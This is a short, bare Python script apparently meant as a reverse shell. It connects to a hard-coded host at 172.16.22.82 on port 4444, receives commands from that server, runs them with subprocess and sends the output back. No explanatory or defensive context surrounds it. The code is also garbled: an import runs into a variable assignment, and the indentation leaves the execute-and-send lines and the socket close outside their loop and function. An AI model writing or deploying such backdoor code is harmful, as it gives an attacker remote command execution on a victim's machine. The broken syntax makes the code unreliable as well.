def run():
  import socket
  import subprocess SERVER_HOST = "172.16.22.82"
  SERVER_PORT = 4444
  BUFFER_SIZE = 1024

  s = socket.socket()
  s.connect((SERVER_HOST, SERVER_PORT))
# receive the greeting message
  message = s.recv(BUFFER_SIZE).decode()
  print("Server:", message)
  while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
       break
    
  output = subprocess.getoutput(command)
  s.send(output.encode())

s.close()
